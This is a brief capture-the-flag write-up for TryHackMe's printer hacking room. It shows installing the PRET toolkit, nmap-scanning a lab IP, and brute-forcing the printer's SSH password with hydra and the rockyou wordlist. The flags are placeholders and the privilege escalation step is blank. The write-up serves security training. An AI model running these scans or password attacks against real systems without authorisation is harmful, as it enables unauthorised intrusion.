# [Printer Hacking 101](https://tryhackme.com/room/printerhacking101)

> Learn about (and get hands on with) printer hacking and understand the basics of IPP.

## Prepare

install this toolkit to exploit local network printer

```
git clone https://github.com/RUB-NDS/PRET && cd PRET
python2 -m pip install colorama pysnmP
```

automatic printer discovery

```
python pret.py
```

## Scanning

scan the machine

```
nmap -sS -T4 10.10.103.120
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/695be9e7-ea0c-4688-af66-96d885f85631)

i found 2 services are ipp and ssh

## HTTP

CUPS open source print server uses IPP protocol for print management

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ceb437d5-2046-4d3a-b664-2e1dbef73359)

## Exploitation

using hydra to crack the ssh password of printer

```
hydra -l printer -P /usr/share/wordlists/rockyou.txt ssh://10.10.103.120
```


.

| Flag | user.txt |
| --- | --- |
| Answer | <flag> |

## Privilege Escalation

.

| Flag | root.txt |
| --- | --- |
| Answer | <flag> |
